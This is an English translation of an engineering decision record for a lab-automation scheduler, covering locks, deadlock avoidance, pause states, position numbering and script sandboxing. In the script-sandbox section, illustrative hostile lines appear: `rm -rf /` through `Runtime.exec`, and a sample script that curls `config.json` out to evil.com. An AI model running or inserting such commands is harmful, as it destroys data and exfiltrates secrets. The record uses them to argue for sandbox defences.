# Concurrent Scheduling Decision Record

> **English edition.** The Chinese original is [`docs/并发调度决策记录.md`](../并发调度决策记录.md); this is
> a line-for-line translation. Numbers, commit hashes and file paths are identical to
> the Chinese source — if they ever disagree, the Chinese original wins.

> Records **why this route and not another**.
> Each decision states clearly: the problem at the time, the alternatives, why this one
> was chosen, and what it costs.

---

## D101. Island lock → device lock

**Decision date**: 2026-11-02
**Trigger**: the user pointed out that "one island has multiple devices and long workflows, so we need multiple experiments running concurrently to be efficient"

### Problem

Initially we used **island-level mutual exclusion**: only one experiment could run on an island at a time.

```
Experiment A: incubate for 30 minutes (occupies only the incubator)
Experiment B: centrifuge for 5 minutes (occupies only the centrifuge)
Island lock → B waits pointlessly for 30 minutes. Pure waste.
```

### Alternatives

| Option | Advantage | Disadvantage |
|---|---|---|
| **A. Keep the island lock** | Absolutely safe | Concurrency 1, extremely low efficiency |
| **B. Device lock** | The granularity is just right | Occupancy has to be maintained for every device |
| **C. No lock** | The fastest | Collisions are inevitable |

### Choice: B

**Rationale**: inside an island **only the robot arm is genuinely shared** (it carries one
plate at a time); the other devices (incubator / centrifuge / plate reader) can run in
parallel.

**Implementation**:

```sql
UPDATE device_state SET current_run_id = ?, status = 'running'
WHERE resource_id = ? AND (current_run_id IS NULL OR current_run_id = ?)
RETURNING resource_id
```

**Cost**:
- `current_run_id` has to be maintained (risk of orphan locks, see D102)
- When the reservation fails we have to retry / queue

**Effect**: with 4 concurrent runs, 1 succeeded and 3 were rejected → **all 4 succeeded**,
total elapsed time 8.78 seconds.

---

## D102. The robot arm is a "transient resource", not an "exclusive resource"

**Decision date**: 2026-11-02
**Trigger**: the user pointed out that "the robot arm is idle once it has finished carrying, and other workflows can call it"

### Key insight

The robot arm and the incubator are **different in nature**:

| Device | Occupancy characteristic |
|---|---|
| **Incubator** | Occupied for 30 minutes (the whole task) |
| **Centrifuge** | Occupied for 5 minutes (the whole task) |
| **Robot arm** | Occupied for **a few seconds to a few tens of seconds** (only during the carry action) |

**If the robot arm were locked for the whole task, the entire island would degenerate
into serial execution** — because every experiment has to move a plate, an experiment
that runs for 30 minutes occupies the robot arm for 30 minutes.

### Implementation: step-level acquire / release

`DeviceLock` acquires in **`onStepStart` and releases in `onStepDone`** — **each action is
locked separately**.

```
Transfer starts → take the robot arm → carry done → release    ← occupies only 2-5 s
Wait for B to run for 30 min → robot arm idle                   ← not occupied
```

**Measured verification**:

```
Device      Capability  Lock owner
ID1731      TRANSFER    (empty)    ← released as soon as the carry is done ✅
ID1731-2    TRANSFER    (empty)
```

### Cost and risk

**Cost**: the robot arm is acquired and released frequently, which carries lock overhead
(one UPDATE each time, about 1-2 ms).

**Risk**: **lock leakage** — if `onStepDone` never fires (the thread is killed, the code
path is exceptional), the robot arm stays occupied forever.

**Countermeasure**: the heartbeat periodically clears orphan locks (see D103).

---

## D103. Orphan locks: heartbeat cleanup and the pitfall of enum comparison

**Decision date**: 2026-11-02
**Trigger**: testing found two INCUBATE devices still holding a runId from 10 hours earlier

### Problem

```
ID1183  current_run_id = 204994   ← this run completed long ago
```

**Consequence**: that device is **permanently unavailable** until the service is restarted.

**Root cause (three)**:

1. The execution thread was `kill -9`-ed, so the finally block never ran
2. A code path was taken that does not go through `onStepDone`
3. **The `runId` did not match at release time** (the two ID conversions went wrong)

### Implementation

The heartbeat clears once every 10 seconds:

```sql
UPDATE device_state ds SET current_run_id = NULL, status = 'idle'
WHERE ds.current_run_id IS NOT NULL
  AND EXISTS (SELECT 1 FROM run r WHERE r.id = ds.current_run_id
              AND r.status::text IN ('completed','failed','aborted','cancelled'))
```

### The pitfall we hit: enum comparison needs `::text`

The first version used `r.status IN (...)`, and the **SQL failed silently** (the
exception was swallowed by the catch); running it by hand revealed that `::text` is
required:

```sql
-- Wrong (comparing an enum with string literals; the types do not match)
AND r.status IN ('completed', ...)

-- Correct
AND r.status::text IN ('completed', ...)
```

**Lesson**: `catch (SQLException e) { return 0; }` hides every SQL error.
Cleanup operations must at least log.

---

## D104. Variable isolation: ThreadLocal plus mandatory cleanup

**Decision date**: 2026-11-02
**Trigger**: after the concurrency verification we realised `withVars` is a process-wide shared Map

### Problem

`WorkflowService` is a singleton, and `runtimeVars` / `islandFilter` are ordinary fields:

```
Thread A: withVars({"plate": "A-1"})
Thread B: withVars({"plate": "B-1"})     ← overwrites A's
Thread A: substVars("${plate}") → "B-1"  ❌
```

### Alternatives

| Option | Advantage | Disadvantage |
|---|---|---|
| **A. Explicit parameters** | Cleanest, no implicit state | `substVars` sits deep inside `loadMethodParams`; 4-5 methods have to change |
| **B. ThreadLocal** | The change is localised | It has to be cleaned up, otherwise thread-pool reuse cross-contaminates |

### Choice: B (for now)

**Rationale**: the change is confined to the single class `WorkflowService`; the call
chain is untouched.

**Cost**: **`clearVars()` must be called in the finally block**; both places were
patched:
- `ApiServer.workflowRunJson`
- `ExperimentExecutor.run`

**If we refactor later**: it should become explicit parameter passing (A); ThreadLocal
is a compromise.

---

## D105. Return-path position deadlock: returnTo plus double locking

**Decision date**: 2026-11-02
**Trigger**: the user pointed out that "experiment 1 moved the plate to B, experiment 2 took A's position, and when experiment 1 came back it had nowhere to put the plate"

### Deadlock sequence

```
① Experiment 1 takes the plate: A's L1 is now free
② Experiment 2 sees L1 is free → puts a plate into L1      ← conflict
③ Experiment 1 comes back: L1 is occupied, nowhere to put it
```

### Root cause (the key one)

**It is not that the lock failed to work, it is that the lock's semantics are not
strong enough**: the position lock only governs "does this position hold a plate right
now", and **does not govern "where this plate will have to return to"**.

### Alternatives

| Option | Advantage | Disadvantage |
|---|---|---|
| **A. Add a `returnTo` field, take two locks when picking up the plate** | The root cure | Lower concurrency (two positions are held) |
| **B. If the reservation fails, find an alternative position** | High concurrency | The plate may not return to the expected position, so an alert is required |
| **C. Do nothing, handle it manually** | Zero cost | A human has to intervene on deadlock, which costs more |

### Choice: A as the primary, B as the degradation path

**Rationale**: the cost of a deadlock (human intervention, a stopped line) is far greater
than the loss of concurrency.

**Implementation**:

```json
{
  "method": "Transfer",
  "params": {
    "source": "ID1775",
    "target": "ID1183",
    "returnTo": "ID1775"        ← if unset, defaults to source
  }
}
```

When the plate is taken:

```java
tryReserveTransfer(sourceId, returnSlotId, runId, ttl);
// The existing two-lock API, requested in ascending id order (prevents circular wait)
```

**Cost**: two positions are held, so the concurrency ceiling drops.

**Optional escape hatch**: `reserveReturn: false` turns it off explicitly, and whoever
does the orchestration carries the risk.

---

## D106. What to do when the duration estimate is inaccurate

**Decision date**: 2026-11-02
**Trigger**: the user asked "the estimated duration may not be precise — how do we do dynamic planning"

### Core insight

**Do not rely on exact values to make decisions**; rely on the **relative order** and on
**conservative estimates**.

### Four means

#### ① Do not use absolute values, use intervals

```
Incubation: base=3600s, optimistic 3000s, pessimistic 5400s
```

**The TTL is computed from the pessimistic value** (it is better to hold on for a while
than to have it expire midway).

#### ② Rolling recomputation (rolling horizon)

**After every completed step, correct the estimate with the actual elapsed time**:

```
Estimate: Transfer 45s, actual 62s
Correction: the estimate for later actions of the same kind × 1.38
```

**This is the practical implementation of the "rolling horizon"** — it is not that the
whole path is computed at once; it is "take one step, look, then take the next".

#### ③ Re-plan after a branch

**On reaching an `exclusiveGateway`, plan only the selected branch**:

```
     ┌─ Branch A (taken)   → re-plan the remainder
Gate ┤
     └─ Branch B (skipped) → reserve nothing
```

**Why this matters**: if the unselected branch also reserved resources, it would
**occupy positions and devices out of thin air**.

**Implementation**: after `GraphRunner` has passed the gateway node, it clears the
reservation intent of the other branch.

#### ④ Conservative and give way

**Priority when there is a conflict**:

| Situation | Strategy |
|---|---|
| A short task and a long task want the same resource | **Short task first** (a long task holds it for a long time anyway, so making it wait a little longer costs little) |
| One has a deadline and the other does not | **The one with a deadline first** (EDD, already implemented) |
| Both are urgent | **By the priority field** (already implemented) |

### In one sentence

> **Whether the estimate is accurate does not matter; what matters is that it can be
> corrected when it is wrong**.
> Rolling recomputation + conservative TTL + short-task-first keeps errors from
> accumulating into a deadlock.

---

## D107. Looking ahead: preparing the plates needed later in the workflow

**Decision date**: 2026-11-02
**Trigger**: the user proposed "pull out all the plates that are used later in the workflow"

### What it does

Before execution, scan the downstream nodes and derive:

```json
{
  "plates": ["PL-001"],
  "positions": [
    {"position": "ID1183-L1", "action": "target", "atStep": 3},
    {"position": "ID1775-L2", "action": "return", "atStep": 5}
  ],
  "devices": [
    {"device": "ID1183", "neededAt": "step3"},
    {"device": "ID1731", "neededAt": "step2,step4"}
  ]
}
```

### What it is for

| Purpose | Explanation |
|---|---|
| **Advance reservation** | Reserve only N minutes before it is needed, not everything from the start |
| **Conflict detection** | Before starting you already know "the positions this workflow needs are occupied by another experiment" |
| **Duration estimation** | Accumulate the `duration_model` of each action to get the expected total duration |

### Why we cannot "reserve everything up front"

**It would lock the whole island** — a 10-step workflow may need 5 positions, and if they
are all held nobody else can run.

**The correct approach**: **rolling reservation** — reserve only "what the next step
needs", release it once it is used, and then reserve the follow-on steps.

---

## D108. Decision summary table

| Number | Decision | Alternative | Why not the alternative |
|---|---|---|---|
| D101 | Device lock (not an island lock) | Island lock / no lock | The island lock wastes concurrency; no lock collides |
| D102 | Step-level lock on the robot arm (not held for the whole task) | Whole-task occupancy | It would degenerate the whole island into serial execution |
| D103 | Heartbeat clears orphan locks | Cleanup on restart | A restart is expensive, and nobody knows they have to restart |
| D104 | ThreadLocal (not explicit parameters) | Explicit parameters | The blast radius is large (4-5 methods); a compromise for now |
| D105 | `returnTo` + double locking | Find an alternative when the reservation fails | The cost of a deadlock is higher; the alternative is the degradation path |
| D106 | Rolling recomputation + conservative TTL | Exact estimation | The estimate was never accurate to begin with |
| D107 | Rolling reservation (not all at once) | Reserve everything at once | It would lock the island |

---


---

## D109. Three-layer resource model + wait-graph deadlock detection (the root cure)

**Decision date**: 2026-11-02
**Trigger**: the user pointed out two scenarios that `returnTo` cannot solve

### Scenario 1: B has one entrance/exit + several internal positions

```
B has 3 internal positions
Flow 1: plate 1 enters B position 1
Flow 2: plate 2 enters B position 2      ← these could run in parallel
```

**If we lock "the device B", flow 2 cannot get in** — the granularity of the lock is
wrong.

### Scenario 2: an A→B→C→A cycle with 3 workflows

```
Flow 1 holds A and waits for B
Flow 2 holds B and waits for C
Flow 3 holds C and waits for A
→ a cycle, deadlock is guaranteed
```

`returnTo` double locking can only prevent a single chain's "return position is taken";
**it cannot prevent a cycle**.

### Alternatives

| Option | Can it cure the root? | Implementation cost |
|---|---|---|
| A. Add `returnTo` | Solves the single chain only | 2 days |
| B. Timeout + rollback | It recovers after a deadlock, but collisions still happen | 3 days |
| **C. Three-layer resources + wait graph** | **In theory deadlock-free** | **2 weeks** |
| D. The full banker's algorithm | The most thorough | It requires knowing the maximum demand in advance, which is impossible because workflows have branches |

### Choice: C

**Rationale**: the banker's algorithm requires "knowing the maximum demand in advance",
and workflows have branches and inaccurate durations, so **that premise does not hold in
this project**. The wait graph only records "who is waiting for whom" and does not need
to know the future.

**The resources are split into three layers**:

| Layer | Resource | Sharing | Occupancy duration |
|---|---|---|---|
| L1 position | N per device | **Exclusive** | The whole task |
| L2 entrance/exit | 1 per device | Shared | **Action-level** (a few seconds) |
| L3 robot arm | 1 per island | Shared | **Action-level** (2-5 seconds) |

**The key point**: L2/L3 are both "transient resources" — they are held only during an
action, not for the whole task. This solves the problem of "the robot arm should be idle
as soon as it has finished carrying".

**Deadlock detection**: when a reservation fails, add an edge (P→Q); a DFS detects
cycles, and a cycle means the request is rejected.

### Cost

| Cost | Explanation |
|---|---|
| False rejection | Some requests that would have succeeded are conservatively rejected |
| Complexity | A three-layer model plus a wait graph; hard to debug |
| Overhead | One extra cycle detection per allocation (microsecond scale) |

### Optimisation: switch it off for a single experiment

**Without concurrency there is no deadlock**, so the detection is pure waste.

```
LABOS_DEADLOCK_GUARD=auto   default: enabled only when running > 1
LABOS_DEADLOCK_GUARD=on     force on
LABOS_DEADLOCK_GUARD=off    force off
```

### Status

**Design complete (`docs/资源模型与死锁避免-设计.md`), not implemented in code.**

In three batches:
1. Resource model (1 week) — solves scenario 1
2. Wait-graph detection (1 week) — solves scenario 2
3. Fallback and observability (3 days)

---


---

## D110. Pausing is only possible at an "action boundary"

**Decision date**: 2026-11-02
**Trigger**: the user asked "can it stop while the robot arm is holding a plate"

### Problem

The robot arm grabs the plate from A, moves it halfway up → can it stop here and wait
for a human?

**No. The plate would fall.** The structure of the robot arm does not allow it to hover
while carrying a load.

### Solution: safe pause points

```
Node1 [action1] [action2] [action3] → Node2 ...
           ↑         ↑         ↑
       pausable   pausable   pausable  ← only between actions
```

**While an action is executing, a pause request is only marked, not acted upon.**

### Cost

**The latency of the pause response** = the remaining time of the current action.
At worst that is the 30 minutes of an incubation — **but there is no way around it, it
is a physical constraint**.

### Exception: the manual emergency stop

**The emergency stop is a physical button** and the system cannot intercept it. The
consequence is that the plate position is unknown (see D112).

---

## D111. A fault does not stop everything; look at the dependencies

**Decision date**: 2026-11-02
**Trigger**: the user asked "if one device faults, should the other experiments running
in parallel also pause"

### Answer: it depends

| Faulty object | Scope of impact |
|---|---|
| **An ordinary device** (incubator / centrifuge) | Only the workflows that use it |
| **The robot arm** | The workflows that need transporting (the logistics are broken), but **the action currently executing has to finish** |
| **Plate position UNKNOWN** | All workflows that involve this plate |

### But pausing must release resources

**If a paused execution keeps holding resources, it will drag the whole island to a
standstill**:

```
Flow 1 faults and pauses while using B, but still holds A's position
  → Flow 2 wants A, cannot get it, and is stuck too
```

**Release rules** (including the exemption added by review R2):

| Resource | On pause | Why |
|---|---|---|
| An ordinary "held but unused" position | **Release** | Let other workflows run |
| **The return reservation slot** | **⚠ Keep, do not release** | See the R2 correction below |
| The robot arm (not holding a plate) | **Release** | Do not keep holding it |
| The robot arm (holding a plate) | **Keep** | It cannot let go |
| The device lock in use | **Keep** | The plate may still be inside |

#### ⚠ R2 correction: the return reservation slot must be exempt

**The hard contradiction the review pointed out**:

- D105 requires the return position to be **reserved for the whole trip** when the plate
  is picked up
- D111 requires that on a fault pause the **"held but unused" positions are released**
- **The return reservation slot is precisely a "held but unused" position**

**If we release it as D111 says**:

```
① Take the plate, reserve the return slot L1
② Device fault → pause → release L1 as D111 says
③ Fault fixed → resume → the plate has to go back to L1, but L1 has been taken by someone else
④ The form-1 deadlock reproduces exactly
```

**The rule**: **the semantics of a return reservation slot are a "commitment", not a
"reservation"**.

| Semantics | Meaning | Can it be released because of a pause? |
|---|---|---|
| **Reservation** (reservation) | "I might use it" | ✅ Yes, it can be released |
| **Commitment** (commitment) | "I will definitely use it; without it I deadlock" | ❌ **No, it cannot be released** |

**Implementation**: `resource_booking.source_type` distinguishes the two:

```sql
source_type = 'position-reserve'   -- ordinary reservation, may be released on pause
source_type = 'position-return'    -- return commitment, must be kept on pause
```

**The release SQL on pause has to exclude the second category**:

```sql
DELETE FROM resource_booking
WHERE reserved_by_run = ? AND status = 'active'
  AND source_type <> 'position-return';   -- ← exemption
```

**Cost**: a paused execution still holds the return slot, which affects concurrency.
**But this is necessary** — not holding it leads to a deadlock, and a deadlock costs
more.

### The relationship to the banker's algorithm

A fault changes the available resources, so **the previous safe sequence may no longer
hold and has to be recomputed**.

But **you cannot abort a running action just because "recomputing says it is unsafe"**:

```
Halfway through incubation, the recomputation finds it unsafe → can it stop?
  → No, forcing a stop would ruin the sample
```

**So the safety check only governs "new requests", not "what is already held and in
use"** — this is the practical constraint of non-preemptible resources: the theoretical
basis assumes preemption, and the physical world does not allow it.

---

## D112. Three states for a plate position: KNOWN / UNKNOWN / LOST

**Decision date**: 2026-11-02
**Trigger**: the user asked "how is the state handled when the robot arm is stopped by a
human and erroneous commands are issued"

### Problem

```
The robot arm is holding a plate and a person presses the emergency stop
  → Where is the plate? On the robot arm? In mid-air? On the floor?
  → The system has no idea at all
```

### Solution: three position states

| State | Meaning | How it arises | Handling |
|---|---|---|---|
| **KNOWN** | Definitely at some position | A normal action completed | Normal scheduling |
| **UNKNOWN** | Unknown where it is | An exception during a transfer | **Manual inventory**; all workflows involving this plate are paused |
| **LOST** | Confirmed lost | Confirmed by the manual inventory | Terminate the related workflows and follow the loss procedure |

### The key point: do not guess

**We must never say "the plate is still on the robot arm"** — it may have fallen on the
floor, and a person may have taken it.

**`UNKNOWN` requires human intervention**; the system makes no assumptions at all.

### Resume has to carry a state correction

After a human has handled it, the site and the system records almost certainly differ:

```json
POST /api/runs/{runId}/resume
{
  "action": "continue",
  "corrections": {
    "plate_position": {"plate": "PL-001", "now_at": "ID1183-L1"}
  }
}
```

**Without a correction, every later plate-position judgement is wrong.**

---

## D113. The state machine for human intervention

**Decision date**: 2026-11-02

### Three pause states

| State | Trigger | Resume condition |
|---|---|---|
| `paused_fault` | Device fault | The device heartbeat recovers |
| `waiting_human` | Human handling needed (retries exhausted, plate position mismatch) | A human triggers resume |
| `paused_unknown` | Plate position unknown | Manual inventory + correction |

### Why there are three

**The resume conditions differ**:

- `paused_fault`: it continues automatically once the device is fine (no human
  confirmation needed)
- `waiting_human`: **a human must confirm** (the system does not know whether the human
  has handled it)
- `paused_unknown`: **an inventory is mandatory** (the position is completely unknown,
  which is more serious than the other two)

**Merging them into one state leads to**: the device recovered but nobody noticed, or
people thought it had been handled when it had not.

### The resume interface

```
POST /api/runs/{runId}/resume
  ?action=continue   continue
  &action=retry      retry the current action
  &action=skip       skip (dangerous, double confirmation)
  &action=abort      abort
```

**It must be triggered by a human** — the system cannot guess on its own "whether this
has been handled".

---


---

## D114. The final solution: main-path coarse screening + wait-graph fine control (hybrid)

**Decision date**: 2026-11-02
**Trigger**: after reading "why not the banker's algorithm", the user approved the hybrid
solution proposed there and asked for it to be implemented this way

### The solution

| Stage | Mechanism | What it solves |
|---|---|---|
| **Before start** | Main-path coarse screening (a simplified banker's algorithm, at device granularity) | Whether there is enough capacity is known at the moment Start is pressed |
| **During execution** | Wait-graph fine control (three-layer resources + cycle detection) | Guarantees no deadlock |

### Why the final choice is hybrid rather than a pure wait graph

**The problem with a pure wait graph**: the user presses Start → the system accepts →
it runs for 5 minutes → it gets stuck trying to take a device → **"nothing happened
when I pressed the button"**.

**The positioning of the hybrid**:

| Mechanism | What happens if it computes wrongly |
|---|---|
| Main-path coarse screening | **Only a poor experience** (queue next time), correctness is unaffected |
| Wait-graph fine control | **It must be correct** (the safety floor) |

**The core principle: the coarse screen may be wrong; the fine control may not.**

### How the main path is determined

Three ways, in priority order:

1. **Marked by hand at orchestration time** (recommended) — only the person doing the
   orchestration knows which path is the normal case in business terms
2. **Automatically pick the branch that uses the most resources** — used when there is
   no marker; conservative, so it does not go wrong
3. **The most nodes** — the fallback, there only to give the algorithm a deterministic
   result

### Why the resource unit of the coarse screen is the "device" and not the "position"

| By device | By position |
|---|---|
| 10 devices, the algorithm is fast | 80 positions, the algorithm is slow |
| Sufficient (the device is the main bottleneck) | Over-refined |

**Position conflicts are handled by the fine control (the position lock); the coarse
screen does not deal with them.**

### The fallback when the coarse screen is wrong

```
Coarse screening computes "needs 2 devices" along the main path → pass
Execution takes a branch that actually needs 3 → fine control detects it
  - no cycle → wait (possibly a long time, but no deadlock)
  - cycle → reject, retry with backoff
  - never gets it → timeout alert "resource starvation"
```

**Conclusion: the worst the coarse screen can do is "wait a long time" or "report
starvation"; it will never deadlock.**

### Cost

| Item | Pure wait graph | Hybrid |
|---|---|---|
| Implementation time | 2.5 weeks | **4 weeks** (1.5 weeks more) |
| Guarantees no deadlock | ✅ | ✅ |
| Feedback at start | ❌ | ✅ |

### Status

**Design complete (`docs/混合调度方案-设计.md`), not implemented in code.**

Implementation order (cannot be changed):
1. Three-layer resource model (1 week) — the foundation
2. Wait-graph fine control (1 week) — the safety floor
3. Main-path definition (3 days) — can run in parallel with 1
4. Coarse-screening algorithm + start interface (1 week)
5. Starvation alert + priority ageing (3 days)

---


---

## D115. Position selection: hard-coded in the workflow as the primary, automatic
selection by the scheduler as an option

**Decision date**: 2026-11-02
**Trigger**: the user pointed out the question of which entrance to pick on a
multi-entrance device, and gave an implementation direction

### Problem

Device B has two entrances, IN-1 and IN-2 (or has 8 shelves), and the workflow has to
put a plate in — **which one?**

### Alternatives

| Option | Advantage | Disadvantage |
|---|---|---|
| **A. The scheduler picks an empty slot automatically** | Smart, the user does not have to care | **It needs the device to report its occupancy state in real time**, which is not necessarily supported |
| **B. Hard-coded in the workflow** | Does not depend on device cooperation, it always works | It has to be written out clearly at orchestration time |
| **C. A loop plus variable generation** | More flexible than B; one loop covers 8 positions | It needs variable substitution to support position codes |

### Choice: B/C as the primary, A as an option

**The user's judgement**:

> "I think it is better to hard-code this ourselves. If it could be planned dynamically
> that would of course be better, but that would require other devices to obtain our
> information as well, and **sometimes that is not easy to handle**.
> So for now we will use the approach of hard-coding it in the workflow ourselves."

**Implementation**:

```json
{
  "nodeType": "loop", "varName": "i", "from": 1, "to": 8,
  "body": [{
    "method": "Transfer",
    "params": { "source": "STACKER", "target": "ID1183-L${i}" }
  }]
}
```

**It is expanded into 8 steps**, each with a different `target`, and the robot arm looks
up the coordinates by code.

### What this requires

| # | Requirement | Current state |
|---|---|---|
| 1 | Variable substitution works in target/source | ✅ Exists |
| 2 | A loop node expands into multiple steps | ✅ The canvas has loops |
| 3 | **Substitute the variables before looking up the position** | ⚠ **M1 has to add this** |

### Automatic slot selection is kept as an option

```json
{ "target": "ID1183", "autoPickSlot": true }
```

**It is off by default** — because it depends on device cooperation, which is not
necessarily reliable.

### The user's own words explain why

> "**This is also why we need conditionals, computation and the like to modify
> variables**,
> so as to handle workflows and positions better."

**So the workflow layer needs**:
- **Conditionals** (`exclusiveGateway` + `${plateCount} > 0`)
- **Computation** (a `compute` node: `nextSlot = ${usedSlots} + 1`)
- **Loops** (`loop` + `${i}`)

**All of these are means of "modifying variables"**; the position is assembled from the
variables.

**The scheduler's responsibility**: given a `target=ID1183-L3`, take L3, open L3's door
and carry the plate there.
**Which position to choose is the workflow's business, not the scheduler's.**

---


---

## D116. Position numbering is "an agreement between us and the robot arm", and has to
be formally defined

**Decision date**: 2026-11-02
**Trigger**: the user explained that "the position numbering and ordering of a device are
an agreement between us and the robot arm"

### Problem

If the numbering rule is not clear, this happens:

```
The formula computes ID1183-L1
The robot arm understands L1 as the bottom-most level
The control console understands L1 as the top-most level
→ the plate is put on the wrong level, and it may crash
```

### The standard

**Format**: `{device number}-{type}{ordinal}`

| Form | Format | Example |
|---|---|---|
| Multiple plate positions | `{dev}-L{n}` | `ID1183-L3` |
| Multiple entrances | `{dev}-IN{n}` | `ID1775-IN2` |
| Multiple exits | `{dev}-OUT{n}` | `STACKER-OUT1` |
| Single port | `{dev}-BOTH` | `ID1731-BOTH` |
| Stacking | `{dev}-S{n}` | `STACKER-S5` |
| Docking | `{dev}-DOCK` | `ID1731-DOCK` |

**The ordinal starts at 1** (not 0, to match the natural language of "which level").

**Ordering convention** (to be confirmed with the robot-arm side):

| Device type | Meaning of `L1` | Direction of increase |
|---|---|---|
| Vertical shelf | The bottom-most level | Upwards |
| Horizontal tray | The outermost (by the door) | Inwards |
| Deep-well plate tower | The bottom-most | Upwards |
| Multiple entrances | The one closest to the standby position | From near to far |

**The reason for choosing "start from the bottom / the outer layer"**: the robot arm's
travel is shortest, taking the outer layer does not block the inner layers, and it
matches the logistics intuition of first in, first out.

### How it is computed in a workflow

```json
{ "nodeType": "loop", "varName": "i", "from": 1, "to": 8,
  "body": [{ "method": "Transfer",
             "params": { "target": "ID1183-L${i}" } }] }
```

**Expression capability requirements** (enough is enough; complex functions are
deliberately not supported): arithmetic `+ - * /`, rounding `floor`, conditionals `? :`,
string concatenation, remainder `%`.

### Validation in three layers

| Layer | What it can check |
|---|---|
| **When the orchestration is saved** | Whether a literal code (without `${}`) exists |
| **At execution time** | Look it up after substituting the variables; if it is not found, report the error and hint at the possible cause |
| **Periodic verification** | Devices without positions, gaps in the ordinals |

### The pitfall of parsing

The device number may contain a hyphen (`ID1731-2`), so when parsing `ID1731-2-L1` you
have to look for the first `-L`/`-IN`/`-OUT`/`-S` **from the right**, not from the
beginning.

---


---

## D117. Separating numbering from access order; the expression engine gets its own
parser

**Decision date**: 2026-11-02

### D117.1 The meaning of `L1` is not assumed; it is configured on site via
`order_in_device`

**The user was explicit**:

> "L1 cannot be decided now. Different positions need to be decided on site, and
> when we write this system we have to support a lot of on-site situations."

**A wrong approach that was considered**: stipulating that `L1` must be the bottom-most
level.

**Why it was abandoned**:

| Problem | Explanation |
|---|---|
| Devices differ greatly | Incubator vertical shelves (from the bottom), plate reader horizontal trays (from the outside) |
| The same model can differ too | Some are installed the other way round, some have been modified |
| Only the teaching session reveals it | Only on site is it clear how the robot arm actually picks |

**The standard**: **the number (code) identifies the position, the order
(`order_in_device`) is configured on site**.

**What happens when the two disagree**:

| Scenario | Impact |
|---|---|
| The workflow specifies a concrete number | **No impact** (it goes straight to that coordinate) |
| Automatic empty-slot selection / batch picking | **The order must be followed** (otherwise it picks a blocked level) |

**So `order_in_device` is optional when the workflow specifies a number, and mandatory
for "automatic slot selection / batch picking".**

### D117.2 The expression engine is written by hand; no scripting engine is brought in

**Requirement**: `${usedSlots + 1}`, `${i % 8}`, `${a > b ? 1 : 2}`.

**Alternatives**:

| Option | Dependencies | Safety | Amount of code |
|---|---|---|---|
| Nashorn | None (removed in JDK 15+) | Can execute arbitrary JS | 0 |
| GraalJS | Tens of MB | Can execute arbitrary JS | 0 |
| AviatorScript | One jar | Can execute scripts | 0 |
| **Write it ourselves** | **None** | **Can only do arithmetic** | **~300 lines** |

**Write it ourselves**:

- **Zero dependencies** (consistent with the project's "bare JDK" orientation)
- **Safe** (it is impossible to execute arbitrary code)
- **Controllable** (something that is not supported reports an explicit error, instead of
  "accidentally being supported")

**Capability boundaries (deliberately not done)**:

| Not done | Why |
|---|---|
| String functions | Position numbers are assembled by concatenation; no string processing needed |
| Function definitions | That would turn it into a programming language |
| Loops | A loop is a **node type**, not an expression |
| Objects/arrays | Variables are all scalars |

**Principle**: **an expression only "computes one value", it does not "write logic".**

**Effort**: 2.5 days (tokenizer + parser + evaluator + tests); M1 goes from 1.5 → 1.75
weeks.

**The error message must contain the original expression**:

```
变量未定义：usedSlots（表达式 usedSlots + 1）
表达式求值失败：除数为 0（表达式 1 / 0）
表达式语法错误："1 + "（位置 3：缺少操作数）
```

---


---

## D118. Custom script nodes: a separate-process sandbox, off by default in production

**Decision date**: 2026-11-02
**Trigger**: the user proposed that "a certain node needs a piece of Java code that
reads the state, does some processing and puts the result into a variable"

### The requirement genuinely exists

**An expression can only "compute one value", it cannot "look things up"**:

```
${a + b}              ✅ an expression can compute it
${queryFreeSlots}     ❌ an expression cannot query
${callLimsApi}        ❌ an expression cannot call
```

### Four levels of solution

| Option | Safety | Flexibility | Effort |
|---|---|---|---|
| A. Execute the uploaded .java directly in the main process | ❌ Very low | Extremely high | Small |
| B. Classloader isolation | 🟡 Low (it can be bypassed by reflection) | Extremely high | Medium |
| C. **Separate process + restricted API** ⭐ | 🟡 Medium | High | Medium |
| D. Only pre-installed plugins are allowed | ✅ High | Low | Small |

**Choose C**.

### Why classloader isolation does not work

**Any sandbox inside the same JVM can be bypassed**:

| Bypass | Consequence |
|---|---|
| `System.exit(0)` | Kills the control console |
| `Runtime.exec("rm -rf /")` | Executes a system command |
| `Thread.sleep(Long.MAX)` | Deadlocks the thread |
| Reflection `Class.forName("com.labos...")` | Reaches internal classes |
| SecurityManager | **Deprecated in JDK 17, removed in 21** |

**Only process isolation can hold the line** (at least it can be killed).

### Sandbox measures

| Measure | Implementation |
|---|---|
| Separate process | `java -cp labos-script-api.jar:user.jar`, does not inherit the main classpath |
| Restricted API | Only `ScriptContext` (read variables, read-only queries, logging) |
| Timeout | 5 seconds, then `destroyForcibly` |
| Memory | `-Xmx256m` |
| CPU | `-XX:ActiveProcessorCount=1` |
| No network / no DB | **The API jar simply does not contain those dependencies** |
| Working directory | A temporary directory |

**The two things it cannot stop** (the limits of a process-level sandbox):

| Bad thing | Only the OS can help |
|---|---|
| `Runtime.exec` | A separate system user + `ulimit` |
| Reading and writing absolute paths | Read-only mounts / SELinux |

**So a production environment needs OS-level cooperation, not just code.**

### Access to external systems: you can only "request", not "send it yourself"

```java
// user code
String sample = ctx.fetchExternal("LIMS", "sample/" + id);

// the main process only allows a whitelist
Map<String, ExternalDataSource> allowed = Map.of("LIMS", limsClient);
```

**The user code cannot get at an HTTP client.**

### Enabling it by tier

| Environment | Script feature |
|---|---|
| Development / demo | Enabled, the risk is accepted |
| Test | Enabled, a separate user |
| **Production** | **Off by default**, an administrator has to enable it + review it |

### Why a human has to look at the source code

```java
// It looks like it is computing a position
public Map<String, Object> run(ScriptContext ctx) {
    ctx.log("calculating...");
    Runtime.getRuntime().exec("curl evil.com/$(cat config.json)");
    return Map.of("slot", "L1");
}
```

**Any static analysis may miss something; only a human looking at it is reliable.**

### outputs must be declared

```json
{ "outputs": ["nextSlot"] }
```

**A variable returned by the script must have been declared in `outputs`, otherwise
there is an error** — this prevents a script from quietly modifying other variables and
polluting the context.

### Performance cost

**Starting a JVM costs 200-500 ms each time**. Ten script nodes in a workflow → 2-5
seconds.

**Optimisation option: a resident process pool** — but that reduces the isolation.

**Trade-off: isolation vs performance.**

### Implementation tiers

| Tier | Content | Estimate |
|---|---|---|
| **L1** (do it now) | Expression engine | **2.5 days** |
| **L2** (depending on demand) | The whole script-node feature set | **3 weeks** |

**We recommend doing L1 first** — L2 has the highest risk and 8 times the effort, and
most "dynamic" requirements are covered by an expression plus a loop.

### Status

**Design complete (`docs/自定义脚本节点-设计.md`), not implemented.**

---


---

## D119. Asynchronous result queries: a result table + variable injection, no script
sandbox needed

**Decision date**: 2026-11-02
